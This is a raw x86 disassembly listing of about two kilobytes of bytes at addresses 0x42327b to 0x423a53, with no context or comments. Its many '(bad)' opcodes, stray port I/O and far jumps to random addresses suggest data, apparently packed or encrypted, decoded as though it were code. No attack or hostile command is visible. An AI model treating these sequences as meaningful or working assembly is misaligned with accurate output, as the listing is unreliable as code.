  42327b:	sbb    DWORD PTR [edx+eiz*1],ecx
  42327e:	adc    DWORD PTR [eax],esp
  423280:	test   al,0x79
  423282:	std    
  423283:	mov    ebp,0xa8f78622
  423288:	adc    BYTE PTR [ecx],bl
  42328a:	in     eax,dx
  42328b:	(bad)  
  42328c:	xchg   ecx,eax
  42328d:	jmp    0x4232f9
  42328f:	push   eax
  423290:	sub    al,0x3f
  423292:	sbb    DWORD PTR [edx-0x7e],0x55
  423296:	xchg   ebx,eax
  423297:	jo     0x42327b
  423299:	bnd jle 0x4232e4
  42329c:	cdq    
  42329d:	pop    ss
  42329e:	dec    esp
  42329f:	dec    esp
  4232a0:	inc    ebp
  4232a1:	data16 or al,0x2
  4232a5:	dec    eax
  4232a6:	js     0x423281
  4232a8:	jle    0x423261
  4232aa:	aas    
  4232ab:	ss jmp 0x423293
  4232ae:	mov    eax,0xf226c80f
  4232b3:	psubusw mm3,mm6
  4232b6:	jns    0x4232a4
  4232b8:	out    0xff,eax
  4232ba:	adc    eax,0x1d152a2f
  4232bf:	aam    0x3c
  4232c1:	adc    ebp,edi
  4232c3:	frstor [ebx]
  4232c5:	adc    cl,bl
  4232c7:	ja     0x42329b
  4232c9:	in     eax,dx
  4232ca:	enterw 0xc3ea,0xc2
  4232cf:	add    ebx,edi
  4232d1:	xchg   ebx,eax
  4232d2:	dec    eax
  4232d3:	mov    ebx,gs
  4232d5:	mov    al,al
  4232d7:	ins    BYTE PTR es:[edi],dx
  4232d8:	in     al,0x9
  4232da:	lods   al,BYTE PTR ds:[esi]
  4232db:	pop    ecx
  4232dc:	sbb    ebx,esi
  4232de:	rcl    BYTE PTR [ecx-0x254180ad],0x38
  4232e5:	inc    ebx
  4232e6:	(bad)  
  4232e7:	xchg   esi,eax
  4232e8:	jmp    0x423296
  4232ea:	cwde   
  4232eb:	mov    bh,0xcf
  4232ed:	sbb    eax,0xde67a02c
  4232f2:	repnz outs dx,DWORD PTR ds:[esi]
  4232f4:	and    ch,0x3d
  4232f7:	ss retf 0xf733
  4232fb:	retf   
  4232fc:	pushf  
  4232fd:	popf   
  4232fe:	cld    
  4232ff:	scas   eax,DWORD PTR es:[edi]
  423300:	pop    ds
  423301:	adc    BYTE PTR [ebx],cl
  423303:	aaa    
  423304:	fnstcw WORD PTR [ebp-0x777b37f7]
  42330a:	mov    ecx,0xd1219e1d
  42330f:	fwait
  423310:	jmp    0x4232d8
  423312:	add    DWORD PTR [edx],ebx
  423314:	cmp    DWORD PTR [esi-0x77],ecx
  423317:	push   ebp
  423318:	mov    edi,0x6a16c5cf
  42331d:	fist   WORD PTR [ecx-0x71]
  423320:	inc    ebp
  423321:	out    dx,al
  423322:	inc    edi
  423323:	mov    esp,0x98fd2469
  423328:	icebp  
  423329:	mov    bh,0x52
  42332b:	and    DWORD PTR [eax+eiz*4+0x35],esi
  42332f:	enter  0x9430,0x58
  423333:	jp     0x423380
  423335:	push   ecx
  423336:	in     al,0x3f
  423338:	jmp    0x42331d
  42333a:	jmp    0x4096a15a
  42333f:	push   edi
  423340:	in     eax,0xe8
  423342:	sub    al,0x8d
  423344:	rcr    edi,1
  423346:	add    al,0x94
  423348:	arpl   WORD PTR [edi],di
  42334a:	out    dx,al
  42334b:	or     ah,BYTE PTR [ecx+0xa3afcdc]
  423351:	lahf   
  423352:	jp     0x42337d
  423354:	ins    DWORD PTR es:[edi],dx
  423355:	mov    ch,0x83
  423357:	mov    ebx,0xce76271b
  42335c:	pop    esp
  42335d:	mov    esi,0x8599a433
  423362:	(bad)  
  423363:	imul   edx,ebx,0xffffffbc
  423366:	jmp    0xfece:0x9d42f44
  42336d:	push   edx
  42336e:	ja     0x423322
  423370:	dec    edx
  423371:	mov    gs,WORD PTR [ebp-0x67]
  423374:	bound  ebx,QWORD PTR [esp+esi*2-0x3af1a2c]
  42337b:	jg     0x423301
  42337d:	jns    0x4233e8
  42337f:	inc    esp
  423380:	cld    
  423381:	inc    edx
  423382:	mov    bl,BYTE PTR [edi+0x27]
  423385:	outs   dx,BYTE PTR ds:[esi]
  423386:	adc    al,0x97
  423388:	xchg   esi,eax
  423389:	(bad)  
  42338b:	repz (bad) 
  42338d:	addr16 jmp 0x2e10:0xfd65799b
  423395:	mov    ds:0x6256176e,eax
  42339a:	mov    al,0xc7
  42339c:	int    0x96
  42339e:	adc    BYTE PTR [eax],0xa4
  4233a1:	dec    edi
  4233a2:	push   edx
  4233a3:	repnz imul ebx,DWORD PTR [edx-0x3],0x3ead3ad5
  4233ab:	mov    bh,0x6b
  4233ad:	adc    BYTE PTR [ebp-0x38],ch
  4233b0:	(bad)  
  4233b1:	in     al,dx
  4233b2:	loopne 0x4233a3
  4233b4:	(bad)  
  4233b5:	mul    BYTE PTR [edx+0x72]
  4233b8:	jmp    0x423434
  4233ba:	popf   
  4233bb:	xor    cl,BYTE PTR [eax+eiz*4-0x1fe02080]
  4233c2:	or     eax,0x45243e98
  4233c7:	enter  0x5758,0x50
  4233cb:	cmp    ch,bl
  4233cd:	inc    ebx
  4233ce:	nop
  4233cf:	enter  0x46d1,0x39
  4233d3:	mov    esp,0xc7f98325
  4233d8:	call   0xdaa597e5
  4233dd:	mov    bh,0x8
  4233df:	mov    ebp,ebx
  4233e1:	xchg   edx,eax
  4233e2:	cmp    DWORD PTR [esi-0x394873d4],0xffffffce
  4233e9:	call   0x20449b12
  4233ee:	cmp    al,0xf6
  4233f0:	dec    esp
  4233f1:	aas    
  4233f2:	and    edi,DWORD PTR [eax]
  4233f4:	out    0x65,al
  4233f6:	jp     0x423470
  4233f8:	rcr    BYTE PTR [edx+0x2d],0x58
  4233fc:	or     dl,dh
  4233fe:	mov    ebp,0xb874b5c8
  423403:	frstor gs:[esp+ebx*8-0x27]
  423408:	jmp    0x423465
  42340a:	bound  ebp,QWORD PTR [edi+edx*8-0x54]
  42340e:	out    dx,eax
  42340f:	jno    0x4233b4
  423411:	fistp  WORD PTR [edi]
  423413:	call   0xb6a1:0x3cf9a2ed
  42341a:	repz in al,0xdd
  42341d:	cmp    al,0x21
  42341f:	enter  0xdd74,0x97
  423423:	dec    edi
  423424:	dec    edi
  423425:	xchg   edi,eax
  423426:	adc    DWORD PTR [ecx-0x15],eax
  423429:	xlat   BYTE PTR ds:[ebx]
  42342a:	add    edx,DWORD PTR [ebx+0x4e6a7e16]
  423430:	jmp    0x423448
  423432:	pop    ecx
  423433:	je     0x4234ad
  423435:	jae    0x423455
  423437:	stos   BYTE PTR es:[edi],al
  423438:	dec    eax
  423439:	mov    ebp,0xb1bd0224
  42343e:	jl     0x423480
  423440:	(bad)  
  423441:	xor    al,0x5f
  423443:	aaa    
  423444:	jmp    0x423412
  423446:	lods   al,BYTE PTR ds:[esi]
  423447:	je     0x4234a8
  423449:	sbb    BYTE PTR [esi+0x5cdf8699],bh
  42344f:	ja     0x4233e9
  423451:	cmp    al,0x4d
  423453:	dec    esp
  423454:	sahf   
  423455:	sbb    eax,0x5cebd397
  42345a:	inc    edx
  42345b:	nop
  42345c:	cmp    eax,DWORD PTR [edi+ebx*2+0x44dfb2ef]
  423463:	jmp    0x6be8:0xa3e7235c
  42346a:	std    
  42346b:	inc    ebx
  42346c:	sub    eax,DWORD PTR [esi+0x6fb4b39]
  423472:	mov    eax,ds:0x8b33b5c8
  423477:	imul   edx,edi,0xeb12ef61
  42347d:	or     ebx,DWORD PTR [edi]
  42347f:	aas    
  423480:	push   ebx
  423481:	jecxz  0x423444
  423483:	push   0xd780090b
  423488:	imul   edx,DWORD PTR [edi],0xffffffc5
  42348b:	into   
  42348c:	aaa    
  42348d:	pop    ecx
  42348e:	dec    ebp
  42348f:	iret   
  423490:	jmp    0x423467
  423492:	inc    ecx
  423493:	rcl    BYTE PTR ds:0x11afed2b,1
  423499:	rcl    BYTE PTR [edi],1
  42349b:	enter  0xf949,0xe5
  42349f:	mov    dh,0x3
  4234a1:	sub    eax,0xdbe6736c
  4234a6:	xchg   edi,eax
  4234a7:	jl     0x4234b0
  4234a9:	push   0xffffffbd
  4234ab:	imul   ebp,ecx,0xbec7f035
  4234b1:	push   edx
  4234b2:	stc    
  4234b3:	mov    bl,0x72
  4234b5:	std    
  4234b6:	mov    al,0x10
  4234b8:	jmp    0x4234b9
  4234ba:	aad    0x4d
  4234bc:	inc    esp
  4234bd:	pop    edi
  4234be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234bf:	mov    dl,0xd3
  4234c1:	loop   0x423523
  4234c3:	xor    BYTE PTR [eax+0x9487f87],0x1d
  4234ca:	stc    
  4234cb:	sub    bl,0x8f
  4234ce:	mov    bh,0x2
  4234d0:	aas    
  4234d1:	in     al,dx
  4234d2:	aaa    
  4234d3:	sbb    edx,DWORD PTR [esi]
  4234d5:	(bad)  
  4234d7:	repz inc ebx
  4234d9:	cwde   
  4234da:	fnsave [esi-0x36]
  4234dd:	mov    eax,ds:0xa8ef003
  4234e2:	jge    0x4234f3
  4234e4:	es ds mov dl,0x4c
  4234e8:	jmp    0x534c:0xd4ef66df
  4234ef:	shl    BYTE PTR [esi-0x1b],0xfd
  4234f3:	enter  0xbdd3,0x56
  4234f7:	cmp    eax,0x9edca919
  4234fc:	pop    ecx
  4234fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234fe:	sub    al,0x26
  423500:	jmp    0x4234c0
  423502:	sbb    bl,ah
  423504:	push   esp
  423505:	pop    edx
  423506:	retf   
  423507:	inc    ecx
  423508:	jmp    0x42356f
  42350a:	mov    ebx,0x9bbde926
  42350f:	push   edi
  423510:	jp     0x423549
  423512:	or     al,cl
  423514:	mov    esp,0xb6288ce8
  423519:	xchg   ecx,eax
  42351a:	hlt    
  42351b:	scas   eax,DWORD PTR es:[edi]
  42351c:	jmp    0x4234c1
  42351e:	or     al,0x48
  423520:	pop    ds
  423521:	xchg   esp,eax
  423522:	mov    eax,ds:0xd6d5c7df
  423527:	rcr    BYTE PTR [eax-0x24],cl
  42352a:	push   ecx
  42352b:	leave  
  42352c:	aad    0x45
  42352e:	dec    ebp
  42352f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423530:	jbe    0x423541
  423532:	sub    DWORD PTR [esi-0x4f31461a],esp
  423538:	clc    
  423539:	fstp   st(4)
  42353b:	(bad)  
  42353c:	push   eax
  42353d:	push   es
  42353e:	jl     0x423508
  423540:	retf   0x1790
  423543:	rep stos BYTE PTR es:[edi],al
  423545:	sub    ch,BYTE PTR [edi+0x688beb2b]
  42354b:	push   ss
  42354c:	xchg   BYTE PTR [eax+eiz*1],al
  42354f:	iret   
  423550:	arpl   di,bx
  423552:	inc    edx
  423553:	jae    0x42353e
  423555:	adc    al,0xe6
  423557:	pop    edx
  423558:	push   edi
  423559:	out    dx,al
  42355a:	cld    
  42355b:	adc    BYTE PTR [ecx-0x70],dh
  42355e:	(bad)  
  42355f:	adc    bl,bl
  423561:	sbb    DWORD PTR [edx-0x38],esi
  423564:	ins    DWORD PTR es:[edi],dx
  423565:	mov    esp,0xadd9c88
  42356a:	pop    esi
  42356b:	(bad)  
  42356c:	jmp    0x423541
  42356e:	push   eax
  42356f:	sub    DWORD PTR [eax+0x23],esp
  423572:	sbb    al,0x53
  423574:	sub    cl,0x1c
  423577:	sub    eax,0x19c15f56
  42357c:	(bad)  
  42357d:	stc    
  42357e:	(bad)  
  42357f:	hlt    
  423580:	jmp    0x423519
  423582:	dec    ebp
  423583:	and    DWORD PTR [eax-0x80],edx
  423586:	ds aaa 
  423588:	cmp    eax,0x634df4de
  42358d:	jns    0x42355a
  42358f:	(bad)  
  423590:	sti    
  423591:	cmp    dl,BYTE PTR [edi-0x76cb28]
  423597:	mov    bl,0x7c
  423599:	rcr    BYTE PTR [esi+eiz*4],cl
  42359c:	lds    ebx,FWORD PTR [edi]
  42359e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42359f:	ds xchg bh,bl
  4235a2:	mov    ebp,0x2827accc
  4235a7:	imul   ebx,DWORD PTR [edi],0x5e
  4235aa:	std    
  4235ab:	fs stos DWORD PTR es:[edi],eax
  4235ad:	dec    ecx
  4235ae:	mov    ebx,DWORD PTR [esi-0x21b75768]
  4235b4:	and    BYTE PTR [edx],bl
  4235b6:	std    
  4235b7:	mov    bl,0x2d
  4235b9:	outs   dx,BYTE PTR ds:[esi]
  4235ba:	sbb    eax,0x40cee576
  4235bf:	not    DWORD PTR [edi+eax*8]
  4235c2:	cld    
  4235c3:	ins    DWORD PTR es:[edi],dx
  4235c4:	sub    esi,DWORD PTR [esi+0x74d211c4]
  4235ca:	sub    al,0xc8
  4235cc:	mov    ah,0xa3
  4235ce:	hlt    
  4235cf:	rol    BYTE PTR [ebp-0x65],cl
  4235d2:	ror    BYTE PTR [eax],cl
  4235d4:	jmp    0x4235f7
  4235d6:	inc    ecx
  4235d7:	mov    eax,0x67ef9712
  4235dc:	(bad)  
  4235dd:	(bad)  
  4235df:	inc    esp
  4235e0:	es mov ?,esi
  4235e3:	leave  
  4235e4:	lock je 0x423616
  4235e7:	outs   dx,DWORD PTR ds:[esi]
  4235e8:	jmp    0x4235b7
  4235ea:	sbb    bl,dl
  4235ec:	xchg   DWORD PTR [ebx-0x20c38900],edi
  4235f2:	loopne 0x4235be
  4235f4:	imul   eax,DWORD PTR [esi+0x22b15ce9],0x83fc59fe
  4235fe:	outs   dx,BYTE PTR ds:[esi]
  4235ff:	push   ss
  423600:	jp     0x423657
  423602:	test   eax,0xe5d09446
  423607:	enter  0x8fb0,0x3b
  42360b:	inc    eax
  42360c:	mov    dl,0x3d
  42360e:	or     DWORD PTR [ecx+0x7af3f36],ebp
  423614:	jmp    0x4235b6
  423616:	sbb    DWORD PTR [edx-0x69],esp
  423619:	push   ds
  42361a:	mov    edx,0x18df0cae
  42361f:	push   esi
  423620:	mov    cl,BYTE PTR [ecx+0x39]
  423623:	fs jge 0x423660
  423626:	das    
  423627:	(bad)
  42362a:	cmp    BYTE PTR [esi+0x759e7e2d],cl
  423630:	das    
  423631:	loopne 0x4235d8
  423633:	fdivr  QWORD PTR ss:[edi]
  423636:	out    0x27,al
  423638:	xchg   dl,cl
  42363a:	sub    esi,esi
  42363c:	jmp    0x423625
  42363e:	cmp    BYTE PTR [ecx+edx*1],ah
  423641:	fsubr  st,st(0)
  423643:	xor    bl,BYTE PTR [esi-0x29e7f724]
  423649:	xchg   BYTE PTR [edi],bl
  42364b:	cmp    DWORD PTR [ebx-0x19a0510e],eax
  423651:	jo     0x423617
  423653:	mov    DWORD PTR [ecx],edi
  423655:	mov    ds:0x473838af,al
  42365a:	pop    ebp
  42365b:	mov    esi,DWORD PTR [esi+0x1514a0df]
  423661:	in     eax,0xef
  423663:	(bad)  
  423664:	cmp    al,0x40
  423666:	add    dl,BYTE PTR [esi+0x607d88db]
  42366c:	add    ah,BYTE PTR [eax+ebp*4]
  42366f:	outs   dx,DWORD PTR ds:[esi]
  423670:	jmp    0x10c1f254
  423675:	clc    
  423676:	mov    ecx,DWORD PTR [eax+0x77fd276a]
  42367c:	imul   eax,esi,0x7b
  42367f:	mov    esp,0xcf6a3d6c
  423684:	xchg   ebp,eax
  423685:	inc    ecx
  423686:	idiv   edx
  423688:	mov    ebx,DWORD PTR [edx+0x375ea2d8]
  42368e:	std    
  42368f:	xor    al,BYTE PTR [eax-0x58]
  423692:	xlat   BYTE PTR ds:[ebx]
  423693:	xlat   BYTE PTR ds:[ebx]
  423694:	cmp    ah,0x3
  423697:	enter  0xaf9e,0x7a
  42369b:	mov    al,0xe
  42369d:	cmp    ecx,ebp
  42369f:	sti    
  4236a0:	pop    es
  4236a1:	xchg   ebp,eax
  4236a2:	call   DWORD PTR [edx-0x33aca858]
  4236a8:	ins    BYTE PTR es:[edi],dx
  4236a9:	jg     0x423658
  4236ab:	(bad)  
  4236ac:	std    
  4236ad:	fbstp  TBYTE PTR [ecx-0x750915f6]
  4236b3:	xchg   edi,eax
  4236b4:	lods   eax,DWORD PTR ds:[esi]
  4236b5:	xchg   ebx,eax
  4236b6:	std    
  4236b7:	xchg   ecx,eax
  4236b8:	dec    esi
  4236b9:	xchg   edx,eax
  4236ba:	add    bl,BYTE PTR [ecx-0x36fc5c63]
  4236c0:	mov    bl,0xc7
  4236c2:	cs mov ecx,0xb77b40
  4236c8:	mov    esp,0xd9ccfd6c
  4236cd:	jg     0x4236e6
  4236cf:	pop    eax
  4236d0:	sub    eax,0xfec9b4b8
  4236d5:	call   0xd85e:0xbdbb29ec
  4236dc:	repnz gs std 
  4236df:	jp     0x4236ff
  4236e1:	ds stos DWORD PTR es:[edi],eax
  4236e3:	push   ecx
  4236e4:	adc    edi,DWORD PTR [edx]
  4236e6:	xchg   al,cl
  4236e8:	aas    
  4236e9:	cdq    
  4236ea:	(bad)  
  4236eb:	nop
  4236ec:	stos   BYTE PTR es:[edi],al
  4236ed:	mov    dl,0x24
  4236ef:	mov    bh,0xea
  4236f1:	and    al,0xb6
  4236f3:	sbb    edi,DWORD PTR ds:0xa15ff1d1
  4236f9:	pop    edi
  4236fa:	mov    WORD PTR [eax+0x1871df8e],fs
  423700:	xlat   BYTE PTR ds:[ebx]
  423701:	add    edi,DWORD PTR [eax+0x19]
  423704:	dec    ebp
  423705:	repz cld 
  423707:	xor    cl,ah
  423709:	push   0x50
  42370b:	or     al,0xbf
  42370d:	xchg   ebp,eax
  42370e:	js     0x423748
  423710:	cmp    bl,bh
  423712:	and    DWORD PTR [ecx],esp
  423714:	adc    esi,DWORD PTR [ebp+0x5d]
  423717:	sbb    al,0x33
  423719:	xchg   ebp,edi
  42371b:	pop    ss
  42371c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42371d:	dec    ecx
  42371e:	jg     0x423761
  423720:	jb     0x423713
  423722:	int    0xca
  423724:	xor    DWORD PTR [edi+ecx*2+0x45],esi
  423728:	scas   eax,DWORD PTR es:[edi]
  423729:	retf   
  42372a:	and    ecx,DWORD PTR [eax-0x372cdfae]
  423730:	or     edx,esi
  423732:	add    eax,0x97d42906
  423737:	pop    ss
  423738:	pop    ebx
  423739:	scas   al,BYTE PTR es:[edi]
  42373a:	mov    bh,0xdb
  42373c:	jmp    0x4237a1
  42373e:	push   ss
  42373f:	sub    al,0x6b
  423741:	or     bl,dl
  423743:	xor    eax,0xfac1dc81
  423748:	xchg   BYTE PTR [esi],al
  42374a:	push   0xfffffffe
  42374c:	arpl   ax,cx
  42374e:	(bad)  
  42374f:	pop    ecx
  423750:	out    dx,al
  423751:	in     eax,0x98
  423753:	jns    0x423773
  423755:	(bad)  
  423756:	jg     0x423791
  423758:	jns    0x4236e4
  42375a:	push   edi
  42375b:	mov    esi,0x48166037
  423760:	fwait
  423761:	stc    
  423762:	add    ch,al
  423764:	pop    edi
  423765:	mov    al,0xe5
  423767:	loope  0x42379a
  423769:	or     bl,BYTE PTR [ebx]
  42376b:	dec    eax
  42376c:	dec    edx
  42376d:	add    ebx,edx
  42376f:	jno    0x42373f
  423771:	jecxz  0x423763
  423773:	(bad)  
  423774:	call   0x6917:0x1c286af7
  42377b:	loope  0x423768
  42377d:	addr16 add al,0x74
  423780:	push   eax
  423781:	(bad)  
  423782:	cmp    eax,0x8cdf5b6e
  423787:	mov    esp,0xe97dd3b1
  42378c:	cmp    eax,0xa6b1fc99
  423791:	xor    al,0x5d
  423793:	mov    ebx,0xc857c474
  423798:	in     eax,dx
  423799:	test   al,0xe0
  42379b:	sbb    al,0xd2
  42379d:	mov    ds:0xcbeb3866,eax
  4237a2:	aaa    
  4237a3:	sar    DWORD PTR [esp+edi*2-0x19],0x6c
  4237a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237a9:	fild   QWORD PTR [edi+0x173c7479]
  4237af:	pusha  
  4237b0:	js     0x423781
  4237b2:	das    
  4237b3:	(bad)  
  4237b4:	jmp    0x4237fb
  4237b6:	call   FWORD PTR [eax]
  4237b8:	mov    edx,0xcd54bde5
  4237bd:	fcomip st,st(4)
  4237bf:	in     al,dx
  4237c0:	popa   
  4237c1:	mov    DWORD PTR [ebx],esp
  4237c3:	push   cs
  4237c4:	fwait
  4237c5:	aad    0xfc
  4237c7:	pop    eax
  4237c8:	add    BYTE PTR [esi+eax*2+0x2bf7258f],al
  4237cf:	xchg   esp,eax
  4237d0:	add    eax,esp
  4237d2:	fld    DWORD PTR [ebx-0x1ea4343d]
  4237d8:	sti    
  4237d9:	push   cs
  4237da:	std    
  4237db:	aad    0xc6
  4237dd:	pop    es
  4237de:	xor    al,0x9a
  4237e0:	outs   dx,DWORD PTR ds:[esi]
  4237e1:	fimul  WORD PTR [ecx+0x741614ca]
  4237e7:	and    al,0x44
  4237e9:	xchg   esi,eax
  4237ea:	cmp    al,0xdc
  4237ec:	push   cs
  4237ed:	inc    esi
  4237ee:	std    
  4237ef:	scas   al,BYTE PTR es:[edi]
  4237f0:	mov    ds:0x27880790,eax
  4237f5:	addr16 add eax,ecx
  4237f8:	or     BYTE PTR [esi+0x70],0x6c
  4237fc:	mov    eax,ds:0xebf5db4d
  423801:	inc    ebx
  423802:	loope  0x423804
  423804:	cmp    dh,ah
  423806:	mov    bh,0x17
  423808:	daa    
  423809:	pop    es
  42380a:	fst    st(4)
  42380c:	jmp    0x42382e
  42380e:	retf   0xec92
  423811:	sbb    DWORD PTR [edi+eax*8-0x15],esp
  423815:	jmp    0x3348c399
  42381a:	adc    eax,0xc13f6c67
  42381f:	mov    ah,0xfb
  423821:	lds    eax,FWORD PTR [ecx+0x7ee3eb2b]
  423827:	scas   al,BYTE PTR es:[edi]
  423828:	adc    ebp,DWORD PTR [esi+eax*8+0x1eebed91]
  42382f:	sub    al,0xe1
  423831:	lahf   
  423832:	add    BYTE PTR [esi-0x5e51e6da],0xfc
  423839:	fistp  QWORD PTR [esi]
  42383b:	push   0x7b9eed68
  423840:	sbb    bh,dh
  423842:	add    ebx,esp
  423844:	pop    es
  423845:	(bad)  
  423846:	mov    ebp,0x72776faf
  42384b:	mov    cl,0x6b
  42384d:	icebp  
  42384e:	jge    0x4237e9
  423850:	push   es
  423851:	data16 mov bh,al
  423854:	out    dx,al
  423855:	inc    ebp
  423856:	mov    gs,WORD PTR [ecx+0x3640ff0b]
  42385c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42385d:	adc    ecx,esp
  42385f:	enter  0x6b69,0xaa
  423863:	mov    ch,0x3c
  423865:	imul   edi,esi,0xefe3ebea
  42386b:	stos   BYTE PTR es:[edi],al
  42386c:	fwait
  42386d:	lods   al,BYTE PTR ds:[esi]
  42386e:	inc    edi
  42386f:	bsr    ebx,edi
  423872:	or     eax,0x3ca2c5a9
  423877:	ins    BYTE PTR es:[edi],dx
  423878:	pop    ebp
  423879:	or     esi,ebx
  42387b:	dec    edi
  42387c:	add    ah,BYTE PTR [ecx+0x15]
  42387f:	push   0xde6addd2
  423884:	pop    ds
  423885:	fild   WORD PTR [ebx+0x28abee57]
  42388b:	idiv   BYTE PTR [eax]
  42388d:	sar    ah,1
  42388f:	cmp    BYTE PTR [ebx],bl
  423891:	fs mov ch,0xb3
  423894:	mov    bl,0x7e
  423896:	(bad)  
  423897:	enter  0x33ba,0xfe
  42389b:	mov    edi,eax
  42389d:	mov    gs:0xf96feb0f,al
  4238a3:	arpl   WORD PTR [ecx-0x5293b2d0],sp
  4238a9:	fisttp WORD PTR [edi-0x61]
  4238ac:	pushf  
  4238ad:	sahf   
  4238ae:	aam    0x6f
  4238b0:	mov    bl,0x6a
  4238b2:	daa    
  4238b3:	adc    eax,0xeefdb3eb
  4238b8:	mov    gs,WORD PTR ds:0xdf0fdda6
  4238be:	sahf   
  4238bf:	imul   esp,DWORD PTR [esi+0x5d6cec1f],0xffffff97
  4238c6:	out    0x13,eax
  4238c8:	xor    eax,0xd283325f
  4238cd:	pop    edi
  4238ce:	ror    BYTE PTR [esi+0x2f],cl
  4238d1:	call   0xdf881860
  4238d6:	inc    ecx
  4238d7:	fs mov esi,0xec4b9591
  4238dd:	ror    DWORD PTR [ebp-0x6c],0x71
  4238e1:	(bad)  
  4238e2:	hlt    
  4238e3:	xor    bh,BYTE PTR [ebx]
  4238e5:	add    BYTE PTR [esi-0x38],ch
  4238e8:	enter  0x25b,0x84
  4238ec:	or     eax,0x1d4931f5
  4238f1:	mov    eax,ds:0x59359dfc
  4238f6:	aam    0x30
  4238f8:	pop    edi
  4238f9:	cmp    eax,0x3ecfc834
  4238fe:	mov    eax,0x7aff9b74
  423903:	fs jmp 0x42390a
  423906:	pop    edi
  423907:	jno    0x42397a
  423909:	je     0x42389f
  42390b:	xchg   esi,eax
  42390c:	(bad)  
  42390e:	popa   
  42390f:	mov    eax,ds:0x17095a39
  423914:	sub    ecx,DWORD PTR [ebp-0x80]
  423917:	xchg   ebp,eax
  423918:	out    0x3d,al
  42391a:	cs int 0x38
  42391d:	jnp    0x42390c
  42391f:	or     esp,DWORD PTR [ebx+0x799ba537]
  423925:	(bad)  
  423927:	data16 cmp al,0xf5
  42392a:	mov    ch,0xc6
  42392c:	addr16 mov edx,0x24cd1da0
  423932:	mov    bh,0xca
  423934:	jmp    0x423909
  423936:	ret    
  423937:	(bad)  
  423938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423939:	(bad)  
  42393a:	in     al,dx
  42393b:	(bad)  
  42393c:	mov    esi,0x15f47f6f
  423941:	imul   ebp,DWORD PTR [esi-0x58],0xffffffeb
  423945:	daa    
  423946:	je     0x423989
  423948:	sbb    cl,BYTE PTR [esi-0x2f]
  42394b:	xchg   BYTE PTR [edx+0x35],bh
  42394e:	retf   
  42394f:	enter  0x8362,0x63
  423953:	and    eax,DWORD PTR [edx]
  423955:	in     eax,dx
  423956:	stos   BYTE PTR es:[edi],al
  423957:	jae    0x4239d4
  423959:	pushf  
  42395a:	cld    
  42395b:	sbb    ah,dh
  42395d:	inc    ebp
  42395e:	(bad)  
  42395f:	mov    dl,0x20
  423961:	pop    ecx
  423962:	int3   
  423963:	enter  0x1eaa,0x9
  423967:	loop   0x4239d7
  423969:	fisubr WORD PTR [edi-0x78]
  42396c:	jmp    0xf822:0x80340f5
  423973:	pop    ss
  423974:	push   ecx
  423975:	aas    
  423976:	xor    cl,al
  423978:	jns    0x4239de
  42397a:	mov    cl,0xbb
  42397c:	pop    ebx
  42397d:	push   esi
  42397e:	pop    ss
  42397f:	pop    ds
  423980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423981:	inc    ecx
  423982:	std    
  423983:	in     al,dx
  423984:	cdq    
  423985:	add    esi,DWORD PTR [edi-0x31f9bf05]
  42398b:	(bad)  
  42398c:	jnp    0x4239e6
  42398e:	(bad)  
  42398f:	lock or BYTE PTR [esi+ebp*1-0x5f],0x23
  423995:	je     0x42394a
  423997:	retf   
  423998:	jmp    0x4239ac
  42399a:	imul   esp,esi,0xa328f134
  4239a0:	loopne 0x4239a3
  4239a2:	stc    
  4239a3:	ja     0x4239a2
  4239a5:	fild   QWORD PTR [edi-0x69]
  4239a8:	mov    ds:0xe88c9a8b,eax
  4239ad:	jno    0x4239f6
  4239af:	xor    eax,0x707d4959
  4239b4:	jl     0x423a01
  4239b6:	jecxz  0x42397f
  4239b8:	pop    eax
  4239b9:	xchg   esp,eax
  4239ba:	cmp    al,0x7f
  4239bc:	retf   0x7281
  4239bf:	rcl    ebx,1
  4239c1:	xchg   edi,eax
  4239c2:	jnp    0x4239f3
  4239c4:	inc    DWORD PTR [edi+0x3f]
  4239c7:	and    ebp,DWORD PTR [ebx-0x43e71927]
  4239cd:	test   eax,0x54b05ac8
  4239d3:	xor    DWORD PTR [ecx-0x140c593e],ecx
  4239d9:	push   ebp
  4239da:	mov    eax,DWORD PTR [esi+0x70]
  4239dd:	adc    eax,0xdff66a99
  4239e2:	pop    ss
  4239e3:	sti    
  4239e4:	jbe    0x423a30
  4239e6:	pusha  
  4239e7:	or     ecx,DWORD PTR [eax+0x48]
  4239ea:	std    
  4239eb:	out    0x0,al
  4239ed:	jb     0x4239b4
  4239ef:	fidivr WORD PTR [eax-0x5837f70e]
  4239f5:	mov    ch,0x2b
  4239f7:	sbb    edx,edi
  4239f9:	or     al,0xab
  4239fb:	pop    ebp
  4239fc:	out    0x42,al
  4239fe:	aas    
  4239ff:	outs   dx,DWORD PTR ds:[esi]
  423a00:	lds    edi,FWORD PTR [ebp+0x2afb2ddc]
  423a06:	fld    st(7)
  423a08:	mov    bh,0x4c
  423a0a:	ja     0x423a78
  423a0c:	rcr    DWORD PTR [edx],0x29
  423a0f:	jne    0x4239fc
  423a11:	cmp    cl,cl
  423a13:	cmp    al,0xa0
  423a15:	xchg   ecx,eax
  423a16:	call   0x5c8f:0x77dc4839
  423a1d:	sbb    BYTE PTR [eax],bh
  423a1f:	into   
  423a20:	imul   eax,DWORD PTR [ebx],0xffffffe6
  423a23:	std    
  423a24:	out    0xbd,al
  423a26:	mov    ah,BYTE PTR [ebx-0x1006aaa8]
  423a2c:	dec    esi
  423a2d:	(bad)  
  423a2f:	scas   al,BYTE PTR es:[edi]
  423a30:	addr16 and dl,dh
  423a33:	sbb    al,0xeb
  423a35:	loopne 0x423a91
  423a37:	retf   0x282d
  423a3a:	stos   DWORD PTR es:[edi],eax
  423a3b:	dec    edi
  423a3c:	xor    esp,ebx
  423a3e:	icebp  
  423a3f:	cmp    ebp,0x23381dc5
  423a45:	data16 jne 0x4239dc
  423a48:	fcmovnb st,st(0)
  423a4a:	int3   
  423a4b:	scas   al,BYTE PTR es:[edi]
  423a4c:	lods   eax,DWORD PTR ds:[esi]
  423a4d:	test   ebx,esp
  423a4f:	mov    dh,0xfb
  423a51:	repnz lods eax,DWORD PTR ds:[esi]
  423a53:	xor    ch,bl
